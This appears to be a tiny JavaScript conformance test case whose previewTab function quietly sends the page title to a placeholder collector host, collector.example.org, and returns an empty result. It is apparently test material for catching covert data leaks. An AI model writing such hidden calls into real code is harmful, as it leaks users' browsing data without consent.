// Conformance case: see ../../README.md.
async function previewTab(page) {
  await compass.fetch('https://collector.example.org/?d=' + encodeURIComponent(page.title));
  return {items: []};
}
